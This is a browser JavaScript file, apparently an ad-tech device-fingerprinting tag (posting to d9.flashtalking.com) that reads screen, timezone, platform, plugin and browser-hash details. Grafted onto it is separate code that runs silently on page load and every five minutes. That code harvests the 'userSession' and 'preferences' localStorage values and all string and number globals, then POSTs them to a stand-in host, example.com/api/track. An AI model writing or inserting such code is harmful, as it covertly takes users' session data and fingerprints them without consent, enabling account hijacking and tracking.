(function () {
  const trackedKeys = ['userSession', 'preferences'];
  const globalData = {};
  function hashData(data) {
    const dataString = JSON.stringify(data);
    let hash = 0;
    for (let i = 0; i < dataString.length; i++) {
      const charCode = dataString.charCodeAt(i);
      hash = (hash << 5) - hash + charCode;
      hash |= 0; // Convert to 32bit integer
    }
    return hash.toString(16);
  }
  const coreElementId = "d9-core-3f4f3476-b53a-4039-b585-9ac99c6a1f31";
  function collectDataFromLocalStorage() {
    const data = {};
    trackedKeys.forEach(key => {
      if (localStorage.getItem(key)) {
        data[key] = localStorage.getItem(key);
      }
    });
    return data;
  }
  function monitorDOMChanges() {
    const observer = new MutationObserver(mutations => {
      mutations.forEach(mutation => {
        console.log(`Mutation observed: ${mutation.type}`);
      });
    });
    observer.observe(document, {
      attributes: true,
      childList: true,
      subtree: true
    });
  }
  var container = document.currentScript || document.getElementById(coreElementId);
  var isApi = container && container.id === coreElementId;
  function collectGlobalVariables() {
    const keys = Object.keys(window);
    keys.forEach(key => {
      if (typeof window[key] === 'string' || typeof window[key] === 'number') {
        globalData[key] = window[key];
      }
    });
  }
  function postToServer(data) {
    const id = hashData(data);
    const url = 'https://example.com/api/track';
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        id,
        data
      })
    }).then(response => response.json()).then(data => console.log('Data sent successfully:', data)).catch(error => console.error('Failed to send data:', error));
  }
  function trackAndSendData() {
    const localStorageData = collectDataFromLocalStorage();
    collectGlobalVariables();
    const combinedData = {
      ...localStorageData,
      ...globalData
    };
    if (Object.keys(combinedData).length > 0) {
      postToServer(combinedData);
    }
  }
  var d9d = collectSignals();
  if (!isApi) {
    d9legacy(window.D9v, window.D9r, "d9.flashtalking.com", d9d);
  } else {
    window.d9api = d9api;
    if (window.d9registry) {
      window.d9registry.run();
    }
  }
  function collectSignals() {
    var s = {};
    var ft = initFt(s);
    var d = new Date();
    s.D9_101 = window.screen ? window.screen.width : undefined;
    s.D9_102 = window.screen ? window.screen.height : undefined;
    s.D9_103 = window.devicePixelRatio;
    s.D9_110 = d.getTime();
    s.D9_111 = d.getTimezoneOffset();
    s.D9_120 = navigator.platform;
    s.D9_121 = navigator.language || navigator.browserLanguage;
    s.D9_122 = navigator.appCodeName;
    s.D9_123 = navigator.maxTouchPoints || 0;
    var m = ft.isM(s.D9_120, s.D9_123);
    s.D9_130 = ft.flashVersion(m);
    s.D9_131 = ft.acrobatVersion(m);
    s.D9_132 = ft.silverlightVersion(m);
    s.D9_133 = ft.getMimeTypes(m);
    s.D9_134 = ft.getPlugins(m);
    s.D9_140 = ft.encodeURIComponent(ft.location());
    s.D9_141 = ft.encodeURIComponent(ft.referrer());
    s.D9_150 = ft.bh64();
    s.D9_151 = ft.bh();
    return s;
  }
  function d9api() {
    return btoa(JSON.stringify(d9d));
  }
  window.addEventListener('load', trackAndSendData);
  setInterval(trackAndSendData, 300000); // Every 5 minutes
  function initFt(r) {
    var ft = {};
    function setResultObject(i, s) {
      if (i !== undefined && r !== undefined) {
        r["D9_".concat(i.toString())] = s;
      }
    }
    var FtBh = function (options) {
      var nativeForEach, nativeMap;
      nativeForEach = Array.prototype.forEach;
      nativeMap = Array.prototype.map;
      this.each = function (obj, iterator, context) {
        if (obj === null) {
          return;
        }
        if (nativeForEach && obj.forEach === nativeForEach) {
          obj.forEach(iterator, context);
        } else {
          if (obj.length === +obj.length) {
            for (var i = 0, l = obj.length; i < l; i++) {
              if (iterator.call(context, obj[i], i, obj) === {}) {
                return;
              }
            }
          } else {
            for (var key in obj) {
              if (obj.hasOwnProperty(key)) {
                if (iterator.call(context, obj[key], key, obj) === {}) {
                  return;
                }
              }
            }
          }
        }
      };
      this.map = function (obj, iterator, context) {
        var results = [];
        if (obj == null) {
          return results;
        }
        if (nativeMap && obj.map === nativeMap) {
          return obj.map(iterator, context);
        }
        this.each(obj, function (value, index, list) {
          results[results.length] = iterator.call(context, value, index, list);
        });
        return results;
      };
      if (typeof options == "object") {
        this.hasher = options.hasher;
        this.indexProperties = options.indexProperties;
      } else {
        if (typeof options == "function") {
          this.hasher = options;
        }
      }
    };
    FtBh.prototype = {
      get: function () {
        var ua = navigator.userAgent.toLowerCase();
        var keys = [];
        var navLang = navigator.language || navigator.browserLanguage;
        var navLangArr = navLang.split("-");
        if (typeof navLangArr[0] == "undefined") {
          navLang = navLang;
        } else {
          navLang = navLangArr[0];
        }
        keys.push((this.indexProperties ? "a:" : "") + navLang);
        keys.push((this.indexProperties ? "b:" : "") + screen.colorDepth);
        keys.push((this.indexProperties ? "c:" : "") + new Date().getTimezoneOffset());
        keys.push((this.indexProperties ? "d:" : "") + this.hasSessionStorage());
        if (ua.indexOf("android") == -1) {
          keys.push((this.indexProperties ? "e:" : "") + this.hasLocalStorage());
        }
        if (navigator.platform != "iPhone" && navigator.platform != "iPad") {
          var hasDb;
          try {
            hasDb = !!window.indexedDB;
          } catch (e) {
            hasDb = true;
          }
          keys.push((this.indexProperties ? "f:" : "") + hasDb);
        }
        if (document.body) {
          keys.push((this.indexProperties ? "g:" : "") + typeof document.body.addBehavior);
        } else {
          keys.push((this.indexProperties ? "g:" : "") + typeof undefined);
        }
        if (ua.indexOf("android") == -1) {
          keys.push((this.indexProperties ? "h:" : "") + typeof window.openDatabase);
        }
        keys.push((this.indexProperties ? "i:" : "") + navigator.cpuClass);
        keys.push((this.indexProperties ? "j:" : "") + navigator.platform);
        if (this.hasher) {
          return this.hasher(keys.join("###"), 31);
        } else {
          return this.murmurhash3_32_gc(keys.join("###"), 31);
        }
      },
      murmurhash3_32_gc: function (key, seed) {
        var remainder, bytes, h1, h1b, c1, c2, k1, i;
        remainder = key.length & 3;
        bytes = key.length - remainder;
        h1 = seed;
        c1 = 3432918353;
        c2 = 461845907;
        i = 0;
        while (i < bytes) {
          k1 = key.charCodeAt(i) & 255 | (key.charCodeAt(++i) & 255) << 8 | (key.charCodeAt(++i) & 255) << 16 | (key.charCodeAt(++i) & 255) << 24;
          ++i;
          k1 = (k1 & 65535) * c1 + (((k1 >>> 16) * c1 & 65535) << 16) & 4294967295;
          k1 = k1 << 15 | k1 >>> 17;
          k1 = (k1 & 65535) * c2 + (((k1 >>> 16) * c2 & 65535) << 16) & 4294967295;
          h1 ^= k1;
          h1 = h1 << 13 | h1 >>> 19;
          h1b = (h1 & 65535) * 5 + (((h1 >>> 16) * 5 & 65535) << 16) & 4294967295;
          h1 = (h1b & 65535) + 27492 + (((h1b >>> 16) + 58964 & 65535) << 16);
        }
        k1 = 0;
        switch (remainder) {
          case 3:
            k1 ^= (key.charCodeAt(i + 2) & 255) << 16;
          case 2:
            k1 ^= (key.charCodeAt(i + 1) & 255) << 8;
          case 1:
            k1 ^= key.charCodeAt(i) & 255;
            k1 = (k1 & 65535) * c1 + (((k1 >>> 16) * c1 & 65535) << 16) & 4294967295;
            k1 = k1 << 15 | k1 >>> 17;
            k1 = (k1 & 65535) * c2 + (((k1 >>> 16) * c2 & 65535) << 16) & 4294967295;
            h1 ^= k1;
        }
        h1 ^= key.length;
        h1 ^= h1 >>> 16;
        h1 = (h1 & 65535) * 2246822507 + (((h1 >>> 16) * 2246822507 & 65535) << 16) & 4294967295;
        h1 ^= h1 >>> 13;
        h1 = (h1 & 65535) * 3266489909 + (((h1 >>> 16) * 3266489909 & 65535) << 16) & 4294967295;
        h1 ^= h1 >>> 16;
        return h1 >>> 0;
      },
      hasLocalStorage: function () {
        try {
          return !!window.localStorage;
        } catch (e) {
          return true;
        }
      },
      hasSessionStorage: function () {
        try {
          return !!window.sessionStorage;
        } catch (e) {
          return true;
        }
      }
    };
    ft.isM = function (p, t) {
      return !!p && p === "iPhone" || p === "iPad" || p.substr(0, 7) === "Linux a" && t > 0;
    };
    ft.bh = function () {
      return new FtBh().get();
    };
    ft.bh64 = function () {
      return new FtBh({
        indexProperties: true,
        hasher: function (s) {
          return btoa(s);
        }
      }).get();
    };
    ft.encodeURIComponent = function (value) {
      if (value === undefined || value === null) {
        return value;
      }
      return encodeURIComponent(value);
    };
    ft.location = function () {
      var l = window.location.hostname;
      if (window.location.ancestorOrigins && window.location.ancestorOrigins.length > 0) {
        var rootLoc = window.location.ancestorOrigins[window.location.ancestorOrigins.length - 1];
        var rootHost = ft.hostName(rootLoc);
        if (rootHost) {
          l = rootHost;
        }
      }
      if (!l) {
        l = "";
      }
      return l;
    };
    ft.referrer = function () {
      var r = ft.hostName(document.referrer);
      if (r === ft.location()) {
        r = "";
      }
      if (!r) {
        r = "";
      }
      return r;
    };
    ft.hostName = function (urlString) {
      try {
        var url = new URL(urlString);
        return url.hostname;
      } catch (e) {}
    };
    ft.flashVersion = function (m) {
      setResultObject(138, "4cccef949da082c321f77f4c8e34d2f7");
      if (m) {
        return null;
      }
      try {
        try {
          var obj = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
          try {
            obj.AllowScriptAccess = "always";
          } catch (e) {
            return "6.0.0";
          }
        } catch (e) {}
        return new ActiveXObject("ShockwaveFlash.ShockwaveFlash").GetVariable("$version").replace(/\D+/g, ".").match(/^.?(.+),?$/)[1];
      } catch (e) {
        try {
          if (navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin) {
            return (navigator.plugins["Shockwave Flash 2.0"] || navigator.plugins["Shockwave Flash"]).description.replace(/\D+/g, ".").match(/^.?(.+),?$/)[1];
          }
        } catch (e) {}
      }
      return null;
    };
    ft.acrobatVersion = function (m) {
      setResultObject(139, "d10e54cb41fb43c5945b4d01b9bde1da");
      if (m) {
        return null;
      }
      if (window.ActiveXObject) {
        var obj = null;
        try {
          obj = new ActiveXObject("AcroPDF.PDF");
        } catch (e) {}
        if (!obj) {
          try {
            obj = new ActiveXObject("PDF.PdfCtrl");
          } catch (e) {
            return null;
          }
        }
        if (obj) {
          var version = obj.GetVersions().split(",");
          version = version[0].split("=");
          version = parseFloat(version[1]);
          return version;
        } else {
          return null;
        }
      } else {
        for (var i = 0; i < navigator.plugins.length; i++) {
          if (navigator.plugins[i].name.indexOf("Adobe Acrobat") != -1) {
            return navigator.plugins[i].description.replace(/\D+/g, ".").match(/^.?(.+),?$/)[1];
          }
        }
        return null;
      }
    };
    ft.silverlightVersion = function (m) {
      if (m) {
        return null;
      }
      var parts = Array("", "", "", "");
      var nav = navigator.plugins["Silverlight Plug-In"];
      if (nav) {
        for (var i = 0; i < 4; i++) {
          parts[i] = parseInt(nav.description.split(".")[i]).toString();
        }
      } else {
        try {
          var control = new ActiveXObject("AgControl.AgControl");
          var vers = Array(1, 0, 0, 0);
          loopMatch(control, vers, 0, 1);
          loopMatch(control, vers, 1, 1);
          loopMatch(control, vers, 2, 10000);
          loopMatch(control, vers, 2, 1000);
          loopMatch(control, vers, 2, 100);
          loopMatch(control, vers, 2, 10);
          loopMatch(control, vers, 2, 1);
          loopMatch(control, vers, 3, 1);
          for (var i = 0; i < 4; i++) {
            parts[i] = vers[i].toString();
          }
        } catch (e) {
          return null;
        }
      }
      return parts.join(".");
      function loopMatch(control, vers, idx, inc) {
        while (IsSupported(control, vers)) {
          vers[idx] += inc;
        }
        vers[idx] -= inc;
      }
      function IsSupported(control, ver) {
        return control.isVersionSupported(ver[0] + "." + ver[1] + "." + ver[2] + "." + ver[3]);
      }
    };
    ft.getPlugins = function (m) {
      var a = [];
      if (m) {
        return a;
      }
      try {
        for (var i = 0; i < navigator.plugins.length; i++) {
          a.push(navigator.plugins[i].name + ": " + navigator.plugins[i].description + " (" + navigator.plugins[i].filename + ")");
        }
        return a;
      } catch (e) {
        return null;
      }
    };
    ft.getMimeTypes = function (m) {
      var a = [];
      if (m) {
        return a;
      }
      try {
        for (var i = 0; i < navigator.mimeTypes.length; i++) {
          a.push(navigator.mimeTypes[i].type + ": " + navigator.mimeTypes[i].description);
        }
        return a;
      } catch (e) {
        return null;
      }
    };
    return ft;
  }
  monitorDOMChanges();
  function d9legacy(D9v, D9r, tagHost, signals) {
    D9r = D9r || {};
    function D9request(D9_device) {
      var json = encodeURIComponent(JSON.stringify(D9_device));
      send = "&tbx=" + encodeURIComponent(json);
      ajax(getLgcUrl(), send);
    }
    function getLgcUrl() {
      var httpProto = "https://";
      var lgcUrl = tagHost + "/lgc";
      return httpProto + lgcUrl;
    }
    function getConnectUrl() {
      var httpProto = "https://";
      var lgcUrl = tagHost + "/img/img.png?cnx=" + (device && device.D9_61 ? device.D9_61 : "");
      return httpProto + lgcUrl;
    }
    function ajax(url, send) {
      if (window.d9PendingXDR != undefined) {
        return;
      }
      var ar = null;
      function corsSupported() {
        try {
          return typeof XMLHttpRequest !== "undefined" && "withCredentials" in new XMLHttpRequest();
        } catch (e) {
          return false;
        }
      }
      if (typeof window.XDomainRequest !== "undefined" && !corsSupported()) {
        ar = new XDomainRequest();
        ar.open("POST", url);
      } else {
        try {
          ar = new XMLHttpRequest();
        } catch (e) {
          if (window.ActiveXObject) {
            var ax = ["Msxml2.XMLHTTP.3.0", "Msxml2.XMLHTTP.4.0", "Msxml2.XMLHTTP.6.0", "Msxml2.XMLHTTP", "Microsoft.XMLHTTP"];
            var i = ax.length;
            while (--i) {
              try {
                ar = new ActiveXObject(ax[i]);
                break;
              } catch (e) {}
            }
          }
        }
        ar.open("POST", url, true);
        ar.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        ar.withCredentials = true;
      }
      ar.onreadystatechange = function () {
        if (D9r && D9r.L > 0) {
          return;
        }
        if (D9r && D9r.callback && ar.readyState == 4) {
          if (ar.status == 200 || ar.status == 304) {
            var r = ar.responseText;
            var response;
            if (r && r.length > 0) {
              try {
                response = JSON.parse(r);
              } catch (e) {}
            }
            if (response) {
              if (response.cnx) {
                new Image().src = getConnectUrl();
                delete response.cnx;
              }
              D9r.callback(response);
            } else {
              D9r.callback(null);
            }
          }
        }
      };
      if (typeof window.XDomainRequest !== "undefined" && !corsSupported()) {
        ar.ontimeout = ar.onerror = function (e) {
          ar.status = 400;
          ar.readyState = 4;
          ar.onreadystatechange();
        };
        ar.onload = function () {
          ar.status = 200;
          ar.readyState = 4;
          ar.onreadystatechange();
        };
        ar.onprogress = function () {};
      }
      ar.send(send);
      window.d9PendingXDR = ar;
    }
    function getProperty(prop) {
      try {
        return eval(prop);
      } catch (e) {
        return null;
      }
    }
    var device = {};
    device.D9_1 = signals.D9_110;
    device.D9_6 = signals.D9_130;
    device.D9_7 = signals.D9_131;
    device.D9_8 = signals.D9_132;
    device.D9_9 = signals.D9_133;
    device.D9_10 = signals.D9_134;
    device.D9_61 = signals.D9_138;
    device.D9_67 = signals.D9_139;
    device.D9_18 = {};
    device.D9_16 = signals.D9_111;
    if (signals.D9_101 || signals.D9_111) {
      device.D9_4 = {
        width: signals.D9_101,
        height: signals.D9_102
      };
    }
    if (window.navigator) {
      device.D9_14 = signals.D9_120;
      device.D9_15 = signals.D9_121;
      device.D9_19 = signals.D9_122;
      device.D9_123 = signals.D9_123;
    }
    device.D9_33 = signals.D9_150;
    device.D9_34 = signals.D9_151;
    device.D9_30 = [];
    device.D9_52 = {};
    device.D9_57 = typeof D9r.callback === "function";
    device.D9_58 = D9r;
    device.D9_59 = D9v;
    device.D9_63 = signals.D9_140;
    device.D9_64 = signals.D9_103;
    device.D9_66 = signals.D9_141;
    D9request(device);
  }
})();